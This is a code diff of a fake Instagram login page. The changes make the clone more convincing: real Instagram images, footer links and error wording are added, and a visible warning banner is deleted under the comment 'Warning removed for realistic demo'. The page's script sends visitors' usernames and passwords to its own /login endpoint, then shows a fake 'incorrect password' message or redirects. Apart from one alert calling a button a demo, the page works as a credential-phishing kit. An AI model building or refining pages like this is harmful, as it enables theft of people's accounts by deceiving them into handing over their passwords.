@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yt/r/30PrGfR3xhB.png">
     <title>Instagram</title>
     <style>
         * {
@@ -13,65 +14,94 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fafafa;
+            background-color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .main-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            max-width: 935px;
+            width: 100%;
+            margin: 0 auto;
             padding: 20px;
         }
 
-        .container {
+        .phone-mockup {
+            margin-right: 32px;
+            flex-shrink: 0;
+        }
+
+        .phone-mockup img {
+            height: 618px;
+        }
+
+        .form-container {
             max-width: 350px;
             width: 100%;
         }
 
-        .phone-container {
+        .login-box {
             background: white;
             border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 40px 40px 44px;
+            padding: 40px 40px 20px;
             margin-bottom: 10px;
         }
 
-        .logo {
-            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNzUiIGhlaWdodD0iNTEiPjxwYXRoIGZpbGw9IiMyNjI2MjYiIGQ9Ik0xMzUuNSAyNC41YzAtNy40IDYtMTMuNSAxMy41LTEzLjUgNy40IDAgMTMuNSA2IDEzLjUgMTMuNXMtNiAxMy41LTEzLjUgMTMuNWMtNy41IDAtMTMuNS02LTEzLjUtMTMuNXptMTkuOCAwYzAtMy41LTIuOC02LjMtNi4zLTYuM3MtNi4zIDIuOC02LjMgNi4zIDIuOCA2LjMgNi4zIDYuMyA2LjMtMi44IDYuMy02LjN6bS0zNS40LTEyLjd2MjQuNWgtNy4xVjI1LjljMC0zLjQtMS4yLTUuMS0zLjctNS4xLTIuMSAwLTMuMyAxLjQtMy45IDIuN3YxNC44aC03LjFWMTEuOGg2Ljh2My4xYzEuNC0yLjMgMy45LTMuNiA3LTMuNiA1LjQgMCA4IDMuNSA4IDguNXptLTI4LjYtMS4zYy0yLjIgMC00LjEgMS4xLTUuMyAyLjl2MTQuOWgtNy4xVjExLjhoNi44djMuMmMxLjYtMi40IDQuMS0zLjcgNy4xLTMuN3YuNWMwIDIuNC0uMyAzLjctLjUgMy43LS4zIDAtLjcgMC0xIDB6bS0xNi45IDguMWMwIDMuOSAyLjIgNi4xIDUuNCA2LjEgMS44IDAgMy40LS43IDQuNi0xLjlsNC4yIDQuNGMtMi4yIDIuNS01LjQgNC02LjEgNGgtLjJjLTcuMyAwLTEyLjctNS41LTEyLjctMTMuNVM4Mi44IDExIDkwIDExYzcuMyAwIDEyLjcgNS41IDEyLjcgMTMuNXYuMWgtMTcuNHptMTAuNC01LjVjLS4zLTMuNi0yLjQtNS43LTUuNC01LjctMyAwLTUuMSAyLjEtNS40IDUuN2gxMC44em0tMjkuNyAxLjRjMC03LjQgNi4xLTEzLjUgMTMuNS0xMy41IDUuMSAwIDkuNCAyLjggMTEuOCA3LjFsLTYuMyAzLjZjLTEuMi0yLjQtMy42LTMuOS02LjQtMy45LTQuMSAwLTcuMyAzLjQtNy4zIDcuNnMzLjIgNy42IDcuMyA3LjZjMi44IDAgNS4yLTEuNSA2LjQtMy45bDYuMyAzLjZjLTIuNCA0LjMtNi43IDcuMS0xMS44IDcuMS03LjQgMC0xMy41LTYuMS0xMy41LTEzLjV6TTI0LjYgMTEuOGg3LjF2MjQuNWgtNy4xVjMzYy0xLjYgMi40LTQuMSAzLjctNy4xIDMuNy01LjYgMC0xMC4xLTQuNS0xMC4xLTEwLjFWMTEuOGg3LjF2MTQuOGMwIDMuNSAxLjIgNS4xIDMuNyA1LjEgMi4xIDAgMy4zLTEuNCAzLjktMi43VjExLjh6TTIzLjUgMGMwLTIuOCAxLjktNC44IDQuOC00LjhzNC44IDIgNC44IDQuOGMwIDIuOS0xLjkgNC44LTQuOCA0LjhzLTQuOC0xLjktNC44LTQuOHoiLz48L3N2Zz4=');
+        .instagram-logo {
+            background-image: url('data:image/svg+xml;charset=utf-8,%3Csvg xmlns="http://www.w3.org/2000/svg" width="175" height="51"%3E%3Cpath fill="%23262626" d="M57.49 9.56h-9.68v32.37h9.68V9.56zm-4.86-3.05c3.1 0 5.61-2.5 5.61-5.61 0-3.09-2.51-5.61-5.61-5.61-3.1 0-5.61 2.52-5.61 5.61 0 3.11 2.51 5.61 5.61 5.61zM95.56 19.03c-3.74 0-6.3 1.73-7.6 3.35v-2.82h-9.25v32.37h9.64V32.8c0-4.02 1.63-6.29 4.81-6.29 2.98 0 4.43 2.02 4.43 6.01v18.41h9.63V30.27c0-7.77-4.5-11.24-11.66-11.24zM75.86 29.34c-1.44-1.07-4.31-1.84-7.68-2.34-2.8-.41-4.07-1.18-4.07-2.56 0-1.43 1.43-2.43 3.62-2.43 2.31 0 3.81 1.06 3.88 2.76h8.97c-.33-5.43-5.06-8.74-12.74-8.74-7.12 0-12.65 3.26-12.65 8.96 0 4.4 2.86 7.04 8.82 8.02 3.48.58 5.73 1.08 7.01 1.77 1.13.6 1.67 1.45 1.67 2.63 0 1.82-1.67 2.98-4.35 2.98-3.07 0-4.93-1.35-5.05-3.67h-9.05c.26 6.08 5.52 9.36 13.95 9.36 7.65 0 13.41-3.39 13.41-9.12 0-3.5-1.73-6.03-5.74-7.62zM135.5 0c-7.46 0-13.5 6.04-13.5 13.5s6.04 13.5 13.5 13.5 13.5-6.04 13.5-13.5S142.96 0 135.5 0zm0 19.84c-3.5 0-6.34-2.84-6.34-6.34s2.84-6.34 6.34-6.34 6.34 2.84 6.34 6.34-2.84 6.34-6.34 6.34zm-16.59-8.28h-7.12v-5.5h-9.63v5.5h-4.2v7.15h4.2v13.42c0 6.54 3.16 9.53 10.24 9.53 1.88 0 3.63-.19 5.42-.65v-7.32c-1.18.23-2.13.35-3.15.35-2.25 0-3.39-.96-3.39-2.88V18.71h7.63v-7.15z"%3E%3C/path%3E%3C/svg%3E');
             background-size: 175px 51px;
             background-repeat: no-repeat;
-            background-position: center;
+            background-position: center top;
             height: 51px;
-            margin: 0 auto 32px;
+            margin: 22px auto 12px;
+            overflow: hidden;
         }
 
-        form {
-            display: flex;
-            flex-direction: column;
+        .form-group {
+            margin-bottom: 6px;
         }
 
-        input {
-            background-color: #fafafa;
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            background: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            padding: 9px 8px 7px;
             font-size: 12px;
-            margin-bottom: 6px;
+            line-height: 16px;
             outline: none;
+            transition: border-color 0.2s ease;
         }
 
-        input:focus {
+        input[type="text"]:focus,
+        input[type="password"]:focus {
             border-color: #a8a8a8;
+            background: #fff;
+        }
+
+        input[type="text"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #8e8e8e;
         }
 
         .login-button {
+            width: 100%;
             background-color: #0095f6;
-            color: white;
             border: none;
             border-radius: 8px;
-            padding: 7px 16px;
+            color: #fff;
+            cursor: pointer;
             font-size: 14px;
             font-weight: 600;
-            margin-top: 8px;
-            cursor: pointer;
+            padding: 7px 16px;
+            margin: 8px 0;
             transition: background-color 0.2s;
         }
 
@@ -79,48 +109,78 @@
             background-color: #1877f2;
         }
 
-        .login-button:active {
-            opacity: 0.7;
+        .login-button:disabled {
+            opacity: 0.3;
+            cursor: default;
         }
 
-        .divider {
+        .divider-container {
             display: flex;
             align-items: center;
-            margin: 20px 0;
+            margin: 10px 0 18px;
+        }
+
+        .divider-line {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider-text {
             color: #8e8e8e;
             font-size: 13px;
             font-weight: 600;
+            margin: 0 18px;
+            text-transform: uppercase;
         }
 
-        .divider::before,
-        .divider::after {
-            content: "";
-            flex: 1;
-            border-bottom: 1px solid #dbdbdb;
+        .fb-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 8px 0 14px;
+            cursor: pointer;
         }
 
-        .divider span {
-            padding: 0 18px;
+        .fb-icon {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            background: url('data:image/svg+xml;charset=utf-8,%3Csvg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="%23385185"%3E%3Cpath d="M14 0H2C.897 0 0 .897 0 2v12c0 1.103.897 2 2 2h6v-6H6V8h2V6c0-1.654 1.346-3 3-3h2v2h-2c-.551 0-1 .449-1 1v2h3l-.5 2H10v6h4c1.103 0 2-.897 2-2V2c0-1.103-.897-2-2-2z"/%3E%3C/svg%3E') no-repeat center;
+        }
+
+        .fb-login-text {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
         }
 
         .forgot-password {
             text-align: center;
-            margin-top: 12px;
+            font-size: 12px;
+            margin: 12px 0;
         }
 
         .forgot-password a {
             color: #00376b;
-            font-size: 12px;
             text-decoration: none;
+        }
+
+        .error-message {
+            display: none;
+            color: #ed4956;
+            font-size: 14px;
+            text-align: center;
+            margin: 10px 40px;
         }
 
         .signup-box {
             background: white;
             border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 24px 40px;
+            padding: 20px;
             text-align: center;
             font-size: 14px;
+            margin-bottom: 10px;
         }
 
         .signup-box a {
@@ -129,32 +189,51 @@
             text-decoration: none;
         }
 
-        .app-download {
+        .get-app {
             text-align: center;
-            margin-top: 20px;
+            margin: 20px 0;
+        }
+
+        .get-app-text {
             font-size: 14px;
+            margin-bottom: 16px;
         }
 
-        .warning {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: #ff4444;
-            color: white;
-            padding: 5px;
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .app-buttons img {
+            height: 40px;
+            cursor: pointer;
+        }
+
+        .footer {
+            max-width: 935px;
+            margin: 0 auto;
+            padding: 0 20px 52px;
             text-align: center;
-            font-size: 11px;
-            opacity: 0.3;
-            z-index: 1000;
         }
 
-        @media (max-width: 450px) {
-            .phone-container {
-                border: none;
-                background: transparent;
-                padding: 20px 0;
-            }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 12px;
+        }
+
+        .footer-links a {
+            color: #8e8e8e;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .footer-copyright {
+            color: #8e8e8e;
+            font-size: 12px;
         }
 
         /* Loading overlay */
@@ -165,11 +244,10 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.95);
+            background: rgba(255, 255, 255, 0.8);
             z-index: 9999;
             justify-content: center;
             align-items: center;
-            flex-direction: column;
         }
 
         .loading-overlay.active {
@@ -177,12 +255,12 @@
         }
 
         .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0095f6;
+            width: 24px;
+            height: 24px;
+            border: 2px solid #dbdbdb;
+            border-top: 2px solid #000;
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
+            animation: spin 0.8s linear infinite;
         }
 
         @keyframes spin {
@@ -200,10 +278,25 @@
             animation: shake 0.5s;
         }
 
-        .loading-text {
-            margin-top: 20px;
-            color: #262626;
-            font-size: 14px;
+        @media (max-width: 875px) {
+            .phone-mockup {
+                display: none;
+            }
+        }
+
+        @media (max-width: 450px) {
+            body {
+                background-color: #fff;
+            }
+            
+            .login-box {
+                border: none;
+                padding: 0 20px;
+            }
+            
+            .signup-box {
+                border: none;
+            }
         }
     </style>
 </head>
@@ -211,93 +304,149 @@
     <!-- Loading overlay -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
-        <div class="loading-text">Verifying your account...</div>
     </div>
 
-    <div class="container">
-        <div class="phone-container">
-            <div class="logo"></div>
-            
-            <!-- Error message -->
-            <div id="errorMessage" style="display: none; background: #fef5f5; border: 1px solid #f5c6cb; color: #721c24; padding: 10px; border-radius: 5px; margin-bottom: 15px; font-size: 13px; text-align: center;"></div>
-            
-            <form action="/login" method="POST" id="loginForm">
-                <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username">
-                <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
-                <button type="submit" class="login-button">Log In</button>
-            </form>
-            
-            <div class="divider">
-                <span>OR</span>
-            </div>
-            
-            <div class="forgot-password">
-                <a href="#">Forgot password?</a>
-            </div>
+    <div class="main-container">
+        <!-- Phone mockup - only visible on desktop -->
+        <div class="phone-mockup">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/y4/r/NameifKKkqV.png" alt="Instagram">
         </div>
-        
-        <div class="signup-box">
-            Don't have an account? <a href="#">Sign up</a>
+
+        <!-- Login form -->
+        <div class="form-container">
+            <div class="login-box">
+                <div class="instagram-logo"></div>
+                
+                <form id="loginForm">
+                    <div class="error-message" id="errorMessage"></div>
+                    
+                    <div class="form-group">
+                        <input type="text" name="username" id="username" placeholder="Phone number, username, or email" required autocomplete="username" aria-label="Phone number, username, or email">
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="password" name="password" id="password" placeholder="Password" required autocomplete="current-password" aria-label="Password">
+                    </div>
+                    
+                    <button type="submit" class="login-button" id="loginButton">Log in</button>
+                </form>
+                
+                <div class="divider-container">
+                    <div class="divider-line"></div>
+                    <div class="divider-text">or</div>
+                    <div class="divider-line"></div>
+                </div>
+                
+                <div class="fb-login">
+                    <span class="fb-icon"></span>
+                    <span class="fb-login-text">Log in with Facebook</span>
+                </div>
+                
+                <div class="forgot-password">
+                    <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgot password?</a>
+                </div>
+            </div>
+            
+            <div class="signup-box">
+                Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">Sign up</a>
+            </div>
+            
+            <div class="get-app">
+                <p class="get-app-text">Get the app.</p>
+                <div class="app-buttons">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft">
+                </div>
+            </div>
         </div>
     </div>
-    
-    <!-- Warning removed for realistic demo -->
+
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="https://about.meta.com/" target="_blank">Meta</a>
+            <a href="https://about.instagram.com/" target="_blank">About</a>
+            <a href="https://about.instagram.com/blog" target="_blank">Blog</a>
+            <a href="https://about.instagram.com/about-us/careers" target="_blank">Jobs</a>
+            <a href="https://help.instagram.com/" target="_blank">Help</a>
+            <a href="https://developers.facebook.com/docs/instagram" target="_blank">API</a>
+            <a href="https://privacycenter.instagram.com/policy" target="_blank">Privacy</a>
+            <a href="https://help.instagram.com/581066165581870" target="_blank">Terms</a>
+            <a href="https://www.instagram.com/explore/locations/" target="_blank">Locations</a>
+            <a href="https://www.instagram.com/web/lite/" target="_blank">Instagram Lite</a>
+            <a href="https://www.threads.net/" target="_blank">Threads</a>
+            <a href="https://www.facebook.com/help/instagram/261704639352628" target="_blank">Contact Uploading & Non-Users</a>
+            <a href="https://about.meta.com/technologies/meta-verified/" target="_blank">Meta Verified</a>
+        </div>
+        <div class="footer-copyright">
+            © 2025 Instagram from Meta
+        </div>
+    </footer>
 
     <script>
-        // Handle form submission with AJAX for error handling
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const form = this;
-            const button = form.querySelector('.login-button');
-            const username = form.querySelector('[name="username"]').value;
-            const password = form.querySelector('[name="password"]').value;
+            const button = document.getElementById('loginButton');
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
             const errorDiv = document.getElementById('errorMessage');
             
             // Clear previous errors
             errorDiv.style.display = 'none';
+            errorDiv.textContent = '';
             
             // Show loading state
             button.textContent = 'Logging in...';
             button.disabled = true;
             document.getElementById('loadingOverlay').classList.add('active');
             
-            // Submit via AJAX
-            fetch('/login', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: new URLSearchParams({
-                    username: username,
-                    password: password
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: new URLSearchParams({
+                        username: username,
+                        password: password
+                    })
+                });
+                
+                const data = await response.json();
+                
                 if (data.status === 'success') {
-                    // Redirect to Instagram post
+                    // Redirect to Instagram
                     window.location.href = data.redirect;
                 } else {
                     // Show error message
                     document.getElementById('loadingOverlay').classList.remove('active');
                     errorDiv.textContent = data.message || 'Sorry, your password was incorrect. Please double-check your password.';
                     errorDiv.style.display = 'block';
-                    button.textContent = 'Log In';
+                    button.textContent = 'Log in';
                     button.disabled = false;
                     
-                    // Shake animation for error
+                    // Shake animation
                     form.classList.add('shake');
                     setTimeout(() => form.classList.remove('shake'), 500);
+                    
+                    // Focus password field
+                    document.getElementById('password').focus();
+                    document.getElementById('password').select();
                 }
-            })
-            .catch(error => {
+            } catch (error) {
+                console.error('Error:', error);
                 document.getElementById('loadingOverlay').classList.remove('active');
-                errorDiv.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
+                errorDiv.textContent = 'Sorry, there was a problem. Please try again.';
                 errorDiv.style.display = 'block';
-                button.textContent = 'Log In';
+                button.textContent = 'Log in';
                 button.disabled = false;
-            });
+            }
+        });
+
+        // Facebook login (just for show)
+        document.querySelector('.fb-login').addEventListener('click', function() {
+            alert('This feature is not available in this demo.');
         });
     </script>
 </body>
